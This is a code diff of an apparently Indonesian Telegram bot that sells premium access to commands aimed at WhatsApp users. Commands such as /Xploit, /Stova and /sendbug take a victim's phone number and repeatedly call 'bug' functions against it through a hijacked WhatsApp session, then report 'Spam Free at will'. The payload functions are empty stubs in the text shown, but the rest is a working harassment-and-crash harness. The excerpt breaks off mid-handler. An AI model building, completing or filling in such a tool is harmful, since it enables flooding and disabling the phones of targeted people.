 bot.onText(/\/start/, async (msg) => {
-  const chatId = msg.chat.id
-  const from = msg.from
-  const userId = from.id
-  const chatType = msg.chat.type
-  const isGroup = chatType === "group" || chatType === "supergroup"
-  const isOwnerUser = config.OWNER_ID.includes(String(userId))
+    const chatId = msg.chat.id;
+    const from = msg.from;
+    const userId = from.id;
+    const chatType = msg.chat.type;
+    const isGroup = chatType === "group" || chatType === "supergroup";
+    const isOwnerUser = config.OWNER_ID.includes(String(userId));
 
-  if (!isGroup && !isPremium(userId) && !isOwnerUser) {
-    return bot.sendMessage(chatId, "❌ Akses ditolak! Anda bukan user premium. Hubungi owner untuk membeli premium.")
-  }
+    if (!isGroup && !isPremium(userId) && !isOwnerUser) {
+        return bot.sendMessage(chatId, "❌ Akses ditolak! Anda bukan user premium. Hubungi owner untuk membeli premium.");
+    }
 
-  await sendStartMenu(chatId, from)
-})
+    await sendStartMenu(chatId, from);
+});
 
 bot.onText(/\/update (on|off)/, async (msg, match) => {
-  const chatId = msg.chat.id
-  const userId = msg.from.id
-  const mode = match[1].toLowerCase()
-  
-  if (!isOwner(userId) && !adminUsers.includes(userId)) {
-    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.")
-  }
-  
-  if (mode === "on") {
-    autoUpdateEnabled = true;
-    saveAutoUpdateSetting(true);
-    startAutoUpdateChecker();
-    await bot.sendMessage(chatId, `✅ Auto update diaktifkan! Bot akan otomatis update ketika ada versi baru di GitHub.`);
-  } else if (mode === "off") {
-    autoUpdateEnabled = false;
-    saveAutoUpdateSetting(false);
-    stopAutoUpdateChecker();
-    await bot.sendMessage(chatId, `❌ Auto update dinonaktifkan! Gunakan /autoupdate untuk update manual.`);
-  }
-})
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const mode = match[1].toLowerCase();
+    
+    if (!isOwner(userId) && !adminUsers.includes(userId)) {
+        return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
+    }
+    
+    if (mode === "on") {
+        autoUpdateEnabled = true;
+        saveAutoUpdateSetting(true);
+        startAutoUpdateChecker();
+        await bot.sendMessage(chatId, `✅ Auto update diaktifkan! Bot akan otomatis update ketika ada versi baru di GitHub.`);
+    } else if (mode === "off") {
+        autoUpdateEnabled = false;
+        saveAutoUpdateSetting(false);
+        stopAutoUpdateChecker();
+        await bot.sendMessage(chatId, `❌ Auto update dinonaktifkan! Gunakan /autoupdate untuk update manual.`);
+    }
+});
 
 bot.onText(/\/autoupdate/, async (msg) => {
-  const chatId = msg.chat.id
-  const userId = msg.from.id
-  
-  if (!isOwner(userId) && !adminUsers.includes(userId)) {
-    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.")
-  }
-  
-  const statusMsg = await bot.sendMessage(chatId, "🔄 Mengecek update dari GitHub...")
-  
-  const update = await checkForUpdates()
-  
-  if (!update.hasUpdate) {
-    await bot.editMessageText(`✅ Bot sudah versi terbaru! (v${CURRENT_VERSION})`, {
-      chat_id: chatId,
-      message_id: statusMsg.message_id
-    })
-    return
-  }
-  
-  await bot.editMessageText(`📦 Update ditemukan! Versi ${CURRENT_VERSION} → ${update.newVersion}\n🔄 Melakukan update...`, {
-    chat_id: chatId,
-    message_id: statusMsg.message_id
-  })
-  
-  await performUpdate(chatId)
-})
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    
+    if (!isOwner(userId) && !adminUsers.includes(userId)) {
+        return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
+    }
+    
+    const statusMsg = await bot.sendMessage(chatId, "🔄 Mengecek update dari GitHub...");
+    
+    const update = await checkForUpdates();
+    
+    if (!update.hasUpdate) {
+        await bot.editMessageText(`✅ Bot sudah versi terbaru! (v${CURRENT_VERSION})`, {
+            chat_id: chatId,
+            message_id: statusMsg.message_id
+        });
+        return;
+    }
+    
+    await bot.editMessageText(`📦 Update ditemukan! Versi ${CURRENT_VERSION} → ${update.newVersion}\n🔄 Melakukan update...`, {
+        chat_id: chatId,
+        message_id: statusMsg.message_id
+    });
+    
+    await performUpdate(chatId);
+});
 
 bot.onText(/\/checkupdate/, async (msg) => {
-  const chatId = msg.chat.id
-  const userId = msg.from.id
-  
-  if (!isOwner(userId) && !adminUsers.includes(userId)) {
-    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.")
-  }
-  
-  const statusMsg = await bot.sendMessage(chatId, "🔍 Mengecek update dari GitHub...")
-  
-  const update = await checkForUpdates()
-  
-  if (update.hasUpdate) {
-    await bot.editMessageText(`📦 Update tersedia!\n\nVersi saat ini: v${CURRENT_VERSION}\nVersi terbaru: v${update.newVersion}\n\nGunakan /autoupdate untuk update.`, {
-      chat_id: chatId,
-      message_id: statusMsg.message_id
-    })
-  } else {
-    await bot.editMessageText(`✅ Bot sudah versi terbaru! (v${CURRENT_VERSION})\n\nAuto Update: ${autoUpdateEnabled ? "ON (otomatis)" : "OFF (manual)"}`, {
-      chat_id: chatId,
-      message_id: statusMsg.message_id
-    })
-  }
-})
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    
+    if (!isOwner(userId) && !adminUsers.includes(userId)) {
+        return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
+    }
+    
+    const statusMsg = await bot.sendMessage(chatId, "🔍 Mengecek update dari GitHub...");
+    
+    const update = await checkForUpdates();
+    
+    if (update.hasUpdate) {
+        await bot.editMessageText(`📦 Update tersedia!\n\nVersi saat ini: v${CURRENT_VERSION}\nVersi terbaru: v${update.newVersion}\n\nGunakan /autoupdate untuk update.`, {
+            chat_id: chatId,
+            message_id: statusMsg.message_id
+        });
+    } else {
+        await bot.editMessageText(`✅ Bot sudah versi terbaru! (v${CURRENT_VERSION})\n\nAuto Update: ${autoUpdateEnabled ? "ON (otomatis)" : "OFF (manual)"}`, {
+            chat_id: chatId,
+            message_id: statusMsg.message_id
+        });
+    }
+});
 
 bot.onText(/\/blokcmd (.+)/, async (msg, match) => {
-  const chatId = msg.chat.id
-  const userId = msg.from.id
-  
-  if (!isOwner(userId) && !adminUsers.includes(userId)) {
-    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.")
-  }
-  
-  const commandName = match[1].toLowerCase().replace("/", "")
-  
-  if (isCommandBlocked(commandName)) {
-    return bot.sendMessage(chatId, `⚠️ Command /${commandName} sudah dalam keadaan diblokir.`)
-  }
-  
-  blockedCommands.push(commandName)
-  saveBlockedCommands(blockedCommands)
-  
-  bot.sendMessage(chatId, `✅ Command /${commandName} berhasil diblokir. User tidak akan bisa menggunakan command ini.`)
-})
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    
+    if (!isOwner(userId) && !adminUsers.includes(userId)) {
+        return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
+    }
+    
+    const commandName = match[1].toLowerCase().replace("/", "");
+    
+    if (isCommandBlocked(commandName)) {
+        return bot.sendMessage(chatId, `⚠️ Command /${commandName} sudah dalam keadaan diblokir.`);
+    }
+    
+    blockedCommands.push(commandName);
+    saveBlockedCommands(blockedCommands);
+    
+    bot.sendMessage(chatId, `✅ Command /${commandName} berhasil diblokir. User tidak akan bisa menggunakan command ini.`);
+});
 
 bot.onText(/\/bukacmd (.+)/, async (msg, match) => {
-  const chatId = msg.chat.id
-  const userId = msg.from.id
-  
-  if (!isOwner(userId) && !adminUsers.includes(userId)) {
-    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.")
-  }
-  
-  const commandName = match[1].toLowerCase().replace("/", "")
-  
-  if (!isCommandBlocked(commandName)) {
-    return bot.sendMessage(chatId, `⚠️ Command /${commandName} tidak dalam keadaan diblokir.`)
-  }
-  
-  blockedCommands = blockedCommands.filter(cmd => cmd !== commandName)
-  saveBlockedCommands(blockedCommands)
-  
-  bot.sendMessage(chatId, `✅ Command /${commandName} berhasil dibuka. User bisa menggunakan command ini kembali.`)
-})
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    
+    if (!isOwner(userId) && !adminUsers.includes(userId)) {
+        return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
+    }
+    
+    const commandName = match[1].toLowerCase().replace("/", "");
+    
+    if (!isCommandBlocked(commandName)) {
+        return bot.sendMessage(chatId, `⚠️ Command /${commandName} tidak dalam keadaan diblokir.`);
+    }
+    
+    blockedCommands = blockedCommands.filter(cmd => cmd !== commandName);
+    saveBlockedCommands(blockedCommands);
+    
+    bot.sendMessage(chatId, `✅ Command /${commandName} berhasil dibuka. User bisa menggunakan command ini kembali.`);
+});
 
 bot.onText(/\/addpremgrup\s+(\d+)([dhm])?/, async (msg, match) => {
-  const chatId = msg.chat.id
-  const userId = msg.from.id
-  const chatType = msg.chat.type
-  
-  if (chatType !== "group" && chatType !== "supergroup") {
-    return bot.sendMessage(chatId, "❌ Command ini hanya bisa digunakan di dalam grup!")
-  }
-  
-  if (!isOwner(userId) && !adminUsers.includes(userId)) {
-    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.")
-  }
-  
-  const jumlah = parseInt(match[1])
-  const unit = match[2] || 'd'
-  let days = jumlah
-  
-  if (unit === 'h') days = jumlah / 24
-  if (unit === 'm') days = jumlah / (24 * 30)
-  
-  if (days < 1) days = 1
-  
-  await addGroupPremium(chatId, Math.floor(days), userId)
-  
-  const chat = await bot.getChat(chatId)
-  bot.sendMessage(chatId, `✅ Grup "${chat.title}" berhasil ditambahkan ke premium selama ${jumlah}${unit === 'd' ? ' hari' : unit === 'h' ? ' jam' : ' bulan'}! Anggota grup dapat mengetik "add" untuk mendapatkan akses premium.`)
-})
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    
+    if (chatType !== "group" && chatType !== "supergroup") {
+        return bot.sendMessage(chatId, "❌ Command ini hanya bisa digunakan di dalam grup!");
+    }
+    
+    if (!isOwner(userId) && !adminUsers.includes(userId)) {
+        return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
+    }
+    
+    const jumlah = parseInt(match[1]);
+    const unit = match[2] || 'd';
+    let days = jumlah;
+    
+    if (unit === 'h') days = jumlah / 24;
+    if (unit === 'm') days = jumlah / (24 * 30);
+    
+    if (days < 1) days = 1;
+    
+    await addGroupPremium(chatId, Math.floor(days), userId);
+    
+    const chat = await bot.getChat(chatId);
+    bot.sendMessage(chatId, `✅ Grup "${chat.title}" berhasil ditambahkan ke premium selama ${jumlah}${unit === 'd' ? ' hari' : unit === 'h' ? ' jam' : ' bulan'}! Anggota grup dapat mengetik "add" untuk mendapatkan akses premium.`);
+});
 
 bot.onText(/\/delpremgrup/, async (msg) => {
-  const chatId = msg.chat.id
-  const userId = msg.from.id
-  const chatType = msg.chat.type
-  
-  if (chatType !== "group" && chatType !== "supergroup") {
-    return bot.sendMessage(chatId, "❌ Command ini hanya bisa digunakan di dalam grup!")
-  }
-  
-  if (!isOwner(userId) && !adminUsers.includes(userId)) {
-    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.")
-  }
-  
-  const groupId = chatId.toString()
-  const existingGroup = groupPremiumData.find(g => g.groupId === groupId)
-  
-  if (!existingGroup) {
-    return bot.sendMessage(chatId, "❌ Grup ini tidak terdaftar dalam premium grup.")
-  }
-  
-  removeGroupPremium(chatId)
-  
-  const chat = await bot.getChat(chatId)
-  bot.sendMessage(chatId, `✅ Grup "${chat.title}" berhasil dihapus dari daftar premium grup.`)
-})
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    
+    if (chatType !== "group" && chatType !== "supergroup") {
+        return bot.sendMessage(chatId, "❌ Command ini hanya bisa digunakan di dalam grup!");
+    }
+    
+    if (!isOwner(userId) && !adminUsers.includes(userId)) {
+        return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
+    }
+    
+    const groupId = chatId.toString();
+    const existingGroup = groupPremiumData.find(g => g.groupId === groupId);
+    
+    if (!existingGroup) {
+        return bot.sendMessage(chatId, "❌ Grup ini tidak terdaftar dalam premium grup.");
+    }
+    
+    removeGroupPremium(chatId);
+    
+    const chat = await bot.getChat(chatId);
+    bot.sendMessage(chatId, `✅ Grup "${chat.title}" berhasil dihapus dari daftar premium grup.`);
+});
 
 bot.onText(/\/listpremgrub/, async (msg) => {
-  const chatId = msg.chat.id
-  const userId = msg.from.id
-  const chatType = msg.chat.type
-  
-  if (chatType !== "group" && chatType !== "supergroup") {
-    return bot.sendMessage(chatId, "❌ Command ini hanya bisa digunakan di dalam grup!")
-  }
-  
-  if (!isOwner(userId) && !adminUsers.includes(userId)) {
-    return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.")
-  }
-  
-  const groupId = chatId.toString()
-  const group = groupPremiumData.find(g => g.groupId === groupId)
-  
-  if (!group) {
-    return bot.sendMessage(chatId, "❌ Grup ini tidak terdaftar dalam premium grup.")
-  }
-  
-  if (group.members.length === 0) {
-    return bot.sendMessage(chatId, "📌 Belum ada member yang mendaftar premium di grup ini.")
-  }
-  
-  let message = `<blockquote>📋 Daftar Premium Member</blockquote>\n`
-  message += `Grup: ${group.groupTitle}\n`
-  message += `Expires: ${moment(group.expiresAt).format('YYYY-MM-DD HH:mm:ss')}\n━━━━━━━━━━━━━━━━━━\n`
-  
-  group.members.forEach((member, index) => {
-    const expires = moment(member.expiresAt).format('YYYY-MM-DD')
-    message += `${index + 1}. ${member.username || `User ${member.userId}`}\n   ID: <code>${member.userId}</code>\n   Exp: ${expires}\n\n`
-  })
-  
-  bot.sendMessage(chatId, message, { parse_mode: "HTML" })
-})
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    
+    if (chatType !== "group" && chatType !== "supergroup") {
+        return bot.sendMessage(chatId, "❌ Command ini hanya bisa digunakan di dalam grup!");
+    }
+    
+    if (!isOwner(userId) && !adminUsers.includes(userId)) {
+        return bot.sendMessage(chatId, "❌ Akses ditolak! Hanya owner/admin yang bisa menggunakan command ini.");
+    }
+    
+    const groupId = chatId.toString();
+    const group = groupPremiumData.find(g => g.groupId === groupId);
+    
+    if (!group) {
+        return bot.sendMessage(chatId, "❌ Grup ini tidak terdaftar dalam premium grup.");
+    }
+    
+    if (group.members.length === 0) {
+        return bot.sendMessage(chatId, "📌 Belum ada member yang mendaftar premium di grup ini.");
+    }
+    
+    let message = `<blockquote>📋 Daftar Premium Member</blockquote>\n`;
+    message += `Grup: ${group.groupTitle}\n`;
+    message += `Expires: ${moment(group.expiresAt).format('YYYY-MM-DD HH:mm:ss')}\n━━━━━━━━━━━━━━━━━━\n`;
+    
+    group.members.forEach((member, index) => {
+        const expires = moment(member.expiresAt).format('YYYY-MM-DD');
+        message += `${index + 1}. ${member.username || `User ${member.userId}`}\n   ID: <code>${member.userId}</code>\n   Exp: ${expires}\n\n`;
+    });
+    
+    bot.sendMessage(chatId, message, { parse_mode: "HTML" });
+});
 
 bot.onText(/^add$/i, async (msg) => {
-  const chatId = msg.chat.id
-  const userId = msg.from.id
-  const username = msg.from.username || msg.from.first_name
-  const chatType = msg.chat.type
-  
-  if (chatType !== "group" && chatType !== "supergroup") {
-    return
-  }
-  
-  const groupId = chatId.toString()
-  const group = groupPremiumData.find(g => g.groupId === groupId)
-  
-  if (!group) {
-    return bot.sendMessage(chatId, "❌ Grup ini tidak terdaftar dalam premium grup. Hubungi admin untuk mendaftarkan grup.")
-  }
-  
-  if (Date.now() > group.expiresAt) {
-    return bot.sendMessage(chatId, "❌ Masa berlaku premium grup ini sudah habis. Hubungi admin untuk memperpanjang.")
-  }
-  
-  if (isPremium(userId)) {
-    return bot.sendMessage(chatId, `✅ @${username || userId} sudah memiliki akses premium!`, { parse_mode: "HTML" })
-  }
-  
-  const remainingDays = Math.ceil((group.expiresAt - Date.now()) / (1000 * 60 * 60 * 24))
-  
-  await addMemberPremiumFromGroup(chatId, userId, username, remainingDays)
-  
-  bot.sendMessage(chatId, `✅ Selamat @${username || userId}! Anda telah mendapatkan akses premium selama ${remainingDays} hari. Silakan gunakan command bug yang tersedia.`, { parse_mode: "HTML" })
-})
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const username = msg.from.username || msg.from.first_name;
+    const chatType = msg.chat.type;
+    
+    if (chatType !== "group" && chatType !== "supergroup") {
+        return;
+    }
+    
+    const groupId = chatId.toString();
+    const group = groupPremiumData.find(g => g.groupId === groupId);
+    
+    if (!group) {
+        return bot.sendMessage(chatId, "❌ Grup ini tidak terdaftar dalam premium grup. Hubungi admin untuk mendaftarkan grup.");
+    }
+    
+    if (Date.now() > group.expiresAt) {
+        return bot.sendMessage(chatId, "❌ Masa berlaku premium grup ini sudah habis. Hubungi admin untuk memperpanjang.");
+    }
+    
+    if (isPremium(userId)) {
+        return bot.sendMessage(chatId, `✅ @${username || userId} sudah memiliki akses premium!`, { parse_mode: "HTML" });
+    }
+    
+    const remainingDays = Math.ceil((group.expiresAt - Date.now()) / (1000 * 60 * 60 * 24));
+    
+    await addMemberPremiumFromGroup(chatId, userId, username, remainingDays);
+    
+    bot.sendMessage(chatId, `✅ Selamat @${username || userId}! Anda telah mendapatkan akses premium selama ${remainingDays} hari. Silakan gunakan command bug yang tersedia.`, { parse_mode: "HTML" });
+});
 
+// ================= BUG FUNCTIONS (KOSONG) ================= //
 async function brem(sock, target) { }
 async function VisiFriend(sock, target) { }
 async function OfferXForclose(sock, target) { }
@@ -1631,7 +2197,7 @@ async function xatanicaldelayv2(sock, target) { }
 async function MbaPe(sock, target) { }
 
 function createBugSuccessMessage(targetNumber, bugType, date) {
-  return `
+    return `
 <blockquote>⬡═―—⊱「 Primrose Linux Bot 」⊰―—═⬡</blockquote>
 
 ◉ Target : ${targetNumber}
@@ -1639,254 +2205,254 @@ function createBugSuccessMessage(targetNumber, bugType, date) {
 ◉ Status : Successfully Send
 ◉ Date Now : ${date}
 
-<blockquote>⸙ Spam Free at will</blockquote>`
+<blockquote>⸙ Spam Free at will</blockquote>`;
 }
 
 function createCheckButton(targetNumber) {
-  return {
-    inline_keyboard: [[{ text: "📱 CEK TARGET", url: `https://wa.me/${targetNumber}` }]]
-  }
+    return {
+        inline_keyboard: [[{ text: "📱 CEK TARGET", url: `https://wa.me/${targetNumber}` }]]
+    };
 }
 
 function getCurrentDate() {
-  return new Date().toLocaleString('id-ID', {
-    year: 'numeric',
-    month: '2-digit',
-    day: '2-digit',
-    hour: '2-digit',
-    minute: '2-digit',
-    second: '2-digit'
-  })
+    return new Date().toLocaleString('id-ID', {
+        year: 'numeric',
+        month: '2-digit',
+        day: '2-digit',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit'
+    });
 }
 
 async function checkUserAccess(userId, chatId, chatType, commandName) {
-  const isOwnerUser = isOwner(userId)
-  const isPremiumUser = isPremium(userId)
-  
-  if (isCommandBlocked(commandName)) {
-    return false
-  }
-  
-  if (isOwnerUser) return true
-  
-  if (chatType === "private" && !isPremiumUser) {
-    await bot.sendMessage(chatId, "❌ Akses ditolak! Anda bukan user premium. Hubungi owner untuk membeli premium.")
-    return false
-  }
-  
-  return true
+    const isOwnerUser = isOwner(userId);
+    const isPremiumUser = isPremium(userId);
+    
+    if (isCommandBlocked(commandName)) {
+        return false;
+    }
+    
+    if (isOwnerUser) return true;
+    
+    if (chatType === "private" && !isPremiumUser) {
+        await bot.sendMessage(chatId, "❌ Akses ditolak! Anda bukan user premium. Hubungi owner untuk membeli premium.");
+        return false;
+    }
+    
+    return true;
 }
 
 bot.onText(/\/Xploit(?:\s+(\d+))?/, async (msg, match) => {
-  const chatId = msg.chat.id
-  const userId = msg.from.id
-  const chatType = msg.chat.type
-  
-  const hasAccess = await checkUserAccess(userId, chatId, chatType, "xploit")
-  if (!hasAccess) return
-  
-  if (!match[1]) return bot.sendMessage(chatId, "🪧 Format: /xploit 628xxx")
-  
-  const targetNumber = match[1].replace(/[^0-9]/g, "")
-  const target = `${targetNumber}@s.whatsapp.net`
-  const date = getCurrentDate()
-  
-  if (sessions.size === 0) return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.")
-  
-  const sock = sessions.values().next().value
-  
-  await bot.sendMessage(chatId, createBugSuccessMessage(targetNumber, "xploit", date), {
-    parse_mode: "HTML",
-    reply_markup: createCheckButton(targetNumber)
-  })
-  
-  for (let i = 0; i < 70; i++) {
-    await MbaPe(sock, target)
-    await sleep(200)
-  }
-})
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "xploit");
+    if (!hasAccess) return;
+    
+    if (!match[1]) return bot.sendMessage(chatId, "🪧 Format: /xploit 628xxx");
+    
+    const targetNumber = match[1].replace(/[^0-9]/g, "");
+    const target = `${targetNumber}@s.whatsapp.net`;
+    const date = getCurrentDate();
+    
+    if (sessions.size === 0) return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
+    
+    const sock = sessions.values().next().value;
+    
+    await bot.sendMessage(chatId, createBugSuccessMessage(targetNumber, "xploit", date), {
+        parse_mode: "HTML",
+        reply_markup: createCheckButton(targetNumber)
+    });
+    
+    for (let i = 0; i < 70; i++) {
+        await MbaPe(sock, target);
+        await sleep(200);
+    }
+});
 
 bot.onText(/\/Sanjiva(?:\s+(\d+))?/, async (msg, match) => {
-  const chatId = msg.chat.id
-  const userId = msg.from.id
-  const chatType = msg.chat.type
-  
-  const hasAccess = await checkUserAccess(userId, chatId, chatType, "sanjiva")
-  if (!hasAccess) return
-  
-  if (!match[1]) return bot.sendMessage(chatId, "🪧 Format: /Sanjiva 628xxx")
-  
-  const targetNumber = match[1].replace(/[^0-9]/g, "")
-  const target = `${targetNumber}@s.whatsapp.net`
-  const date = getCurrentDate()
-  
-  if (sessions.size === 0) return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.")
-  
-  const sock = sessions.values().next().value
-  
-  await bot.sendMessage(chatId, createBugSuccessMessage(targetNumber, "Sanjiva", date), {
-    parse_mode: "HTML",
-    reply_markup: createCheckButton(targetNumber)
-  })
-  
-  for (let i = 0; i < 10; i++) {
-    await xatanicaldelayv2(sock, target)
-    await sleep(200)
-  }
-})
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "sanjiva");
+    if (!hasAccess) return;
+    
+    if (!match[1]) return bot.sendMessage(chatId, "🪧 Format: /Sanjiva 628xxx");
+    
+    const targetNumber = match[1].replace(/[^0-9]/g, "");
+    const target = `${targetNumber}@s.whatsapp.net`;
+    const date = getCurrentDate();
+    
+    if (sessions.size === 0) return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
+    
+    const sock = sessions.values().next().value;
+    
+    await bot.sendMessage(chatId, createBugSuccessMessage(targetNumber, "Sanjiva", date), {
+        parse_mode: "HTML",
+        reply_markup: createCheckButton(targetNumber)
+    });
+    
+    for (let i = 0; i < 10; i++) {
+        await xatanicaldelayv2(sock, target);
+        await sleep(200);
+    }
+});
 
 bot.onText(/\/Stova(?:\s+(\d+))?/, async (msg, match) => {
-  const chatId = msg.chat.id
-  const userId = msg.from.id
-  const chatType = msg.chat.type
-  
-  const hasAccess = await checkUserAccess(userId, chatId, chatType, "stova")
-  if (!hasAccess) return
-  
-  if (!match[1]) return bot.sendMessage(chatId, "🪧 Format: /Stova 628xxx")
-  
-  const targetNumber = match[1].replace(/[^0-9]/g, "")
-  const target = `${targetNumber}@s.whatsapp.net`
-  const date = getCurrentDate()
-  
-  if (sessions.size === 0) return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.")
-  
-  const sock = sessions.values().next().value
-  
-  await bot.sendMessage(chatId, createBugSuccessMessage(targetNumber, "Stova", date), {
-    parse_mode: "HTML",
-    reply_markup: createCheckButton(targetNumber)
-  })
-  
-  for (let i = 0; i < 7; i++) {
-    await brem(sock, target)
-    await sleep(200)
-  }
-})
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "stova");
+    if (!hasAccess) return;
+    
+    if (!match[1]) return bot.sendMessage(chatId, "🪧 Format: /Stova 628xxx");
+    
+    const targetNumber = match[1].replace(/[^0-9]/g, "");
+    const target = `${targetNumber}@s.whatsapp.net`;
+    const date = getCurrentDate();
+    
+    if (sessions.size === 0) return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
+    
+    const sock = sessions.values().next().value;
+    
+    await bot.sendMessage(chatId, createBugSuccessMessage(targetNumber, "Stova", date), {
+        parse_mode: "HTML",
+        reply_markup: createCheckButton(targetNumber)
+    });
+    
+    for (let i = 0; i < 7; i++) {
+        await brem(sock, target);
+        await sleep(200);
+    }
+});
 
 bot.onText(/\/Chatms(?:\s+(\d+))?/, async (msg, match) => {
-  const chatId = msg.chat.id
-  const userId = msg.from.id
-  const chatType = msg.chat.type
-  
-  const hasAccess = await checkUserAccess(userId, chatId, chatType, "chatms")
-  if (!hasAccess) return
-  
-  if (!match[1]) return bot.sendMessage(chatId, "🪧 Format: /Chatms 628xxx")
-  
-  const targetNumber = match[1].replace(/[^0-9]/g, "")
-  const target = `${targetNumber}@s.whatsapp.net`
-  const date = getCurrentDate()
-  
-  if (sessions.size === 0) return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.")
-  
-  const sock = sessions.values().next().value
-  
-  await bot.sendMessage(chatId, createBugSuccessMessage(targetNumber, "Chatms", date), {
-    parse_mode: "HTML",
-    reply_markup: createCheckButton(targetNumber)
-  })
-  
-  for (let i = 0; i < 35; i++) {
-    await VisiFriend(sock, target)
-    await sleep(200)
-  }
-})
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "chatms");
+    if (!hasAccess) return;
+    
+    if (!match[1]) return bot.sendMessage(chatId, "🪧 Format: /Chatms 628xxx");
+    
+    const targetNumber = match[1].replace(/[^0-9]/g, "");
+    const target = `${targetNumber}@s.whatsapp.net`;
+    const date = getCurrentDate();
+    
+    if (sessions.size === 0) return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
+    
+    const sock = sessions.values().next().value;
+    
+    await bot.sendMessage(chatId, createBugSuccessMessage(targetNumber, "Chatms", date), {
+        parse_mode: "HTML",
+        reply_markup: createCheckButton(targetNumber)
+    });
+    
+    for (let i = 0; i < 35; i++) {
+        await VisiFriend(sock, target);
+        await sleep(200);
+    }
+});
 
 bot.onText(/\/Ganesha(?:\s+(\d+))?/, async (msg, match) => {
-  const chatId = msg.chat.id
-  const userId = msg.from.id
-  const chatType = msg.chat.type
-  
-  const hasAccess = await checkUserAccess(userId, chatId, chatType, "ganesha")
-  if (!hasAccess) return
-  
-  if (!match[1]) return bot.sendMessage(chatId, "🪧 Format: /Ganesha 628xxx")
-  
-  const targetNumber = match[1].replace(/[^0-9]/g, "")
-  const target = `${targetNumber}@s.whatsapp.net`
-  const date = getCurrentDate()
-  
-  if (sessions.size === 0) return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.")
-  
-  const sock = sessions.values().next().value
-  
-  await bot.sendMessage(chatId, createBugSuccessMessage(targetNumber, "Ganesha", date), {
-    parse_mode: "HTML",
-    reply_markup: createCheckButton(targetNumber)
-  })
-  
-  for (let i = 0; i < 10; i++) {
-    await bulldozerV2(sock, target)
-    await sleep(200)
-  }
-})
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const chatType = msg.chat.type;
+    
+    const hasAccess = await checkUserAccess(userId, chatId, chatType, "ganesha");
+    if (!hasAccess) return;
+    
+    if (!match[1]) return bot.sendMessage(chatId, "🪧 Format: /Ganesha 628xxx");
+    
+    const targetNumber = match[1].replace(/[^0-9]/g, "");
+    const target = `${targetNumber}@s.whatsapp.net`;
+    const date = getCurrentDate();
+    
+    if (sessions.size === 0) return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.");
+    
+    const sock = sessions.values().next().value;
+    
+    await bot.sendMessage(chatId, createBugSuccessMessage(targetNumber, "Ganesha", date), {
+        parse_mode: "HTML",
+        reply_markup: createCheckButton(targetNumber)
+    });
+    
+    for (let i = 0; i < 10; i++) {
+        await bulldozerV2(sock, target);
+        await sleep(200);
+    }
+});
 
 bot.onText(/\/sendbug(?:\s+(\d+))?/, async (msg, match) => {
-  const chatId = msg.chat.id
-  const userId = msg.from.id
-  const chatType = msg.chat.type
-  
-  const hasAccess = await checkUserAccess(userId, chatId, chatType, "sendbug")
-  if (!hasAccess) return
-  
-  if (!match[1]) return bot.sendMessage(chatId, "🪧 Format: /sendbug 628xxx")
-  
-  const targetNumber = match[1].replace(/[^0-9]/g, "")
-  const target = `${targetNumber}@s.whatsapp.net`
-  const date = getCurrentDate()
-  
-  if (sessions.size === 0) return bot.sendMessage(chatId, "❌ Tidak ada sender WhatsApp terhubung.")
-  
-  const sock = sessions.values().next().value
-  
-  await bot.sendMessage(chatId, createBugSuccessMessage(targetNumber, "sendbug", date), {
-    parse_mode: "HTML",
-    reply_markup: createCheckButton(targetNumber)
-  })
-  
